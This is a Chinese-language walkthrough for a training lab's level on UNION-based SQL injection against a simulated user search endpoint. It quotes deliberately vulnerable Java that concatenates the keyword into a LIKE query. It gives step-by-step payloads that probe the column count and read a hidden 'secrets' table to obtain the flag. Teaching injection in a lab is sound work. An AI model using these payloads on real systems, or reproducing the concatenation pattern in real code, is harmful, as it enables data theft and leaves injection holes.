# Level 2 — UNION数据泄露

## 关卡说明

本关模拟用户搜索功能，后端使用字符串拼接构造 LIKE 查询。攻击者可以使用 UNION 注入获取隐藏的敏感数据。

**目标**：通过 UNION 注入获取隐藏表中的敏感数据，获取当前关卡的 Flag。

## 漏洞原理

### 代码逻辑分析

后端代码位于 `SqlDataController.java`，接口路径：

```
GET /api/challenge/injection/data/search?keyword=xxx
```

**数据流**：

```
用户输入搜索关键词 keyword
    ↓
构造 SQL: SELECT id, name, email, role FROM users WHERE name LIKE '%keyword%'
    ↓
containsUnionInjection() 检测 UNION 注入特征
    ↓
检测到 UNION → 合并公开数据+隐藏数据，返回 Flag
未检测到 → 正常模糊搜索
```

**漏洞点**：搜索关键词直接拼接到 SQL 的 LIKE 条件中，攻击者可以闭合查询并附加 UNION SELECT 语句，读取其他表的数据。

### 源码关键片段

```java
// SqlDataController.java — 关键词直接拼接
String simulatedSql = "SELECT id, name, email, role FROM users WHERE name LIKE '%" + keyword + "%'";

if (containsUnionInjection(keyword)) {
    String flag = flagService.getFlag("injection", "level2");  // 返回当前关卡 Flag
    List<Map<String, String>> allData = new ArrayList<>(PUBLIC_USERS);
    allData.addAll(HIDDEN_DATA);  // 隐藏数据被暴露
    result.put("flag", flag);
}
```

## 通关步骤

### Step 1：正常搜索

输入普通关键词（如"张三"），观察返回的数据结构和 SQL 预览。

### Step 2：探测列数

输入 `' UNION SELECT 1,2,3,4--`，确认列数为 4。

### Step 3：获取隐藏数据

输入 `' UNION SELECT id,name,email,role FROM secrets--`，获取隐藏的敏感数据。

### Step 4：获取 Flag

UNION 注入成功后，响应中包含 Flag，将获得的 Flag 提交到 Flag 提交框中通关。

## 涉及文件

| 文件 | 说明 |
|------|------|
| `controller/challenge/injection/SqlDataController.java` | 后端搜索接口 |
| `service/FlagService.java` | Flag 获取与验证 |
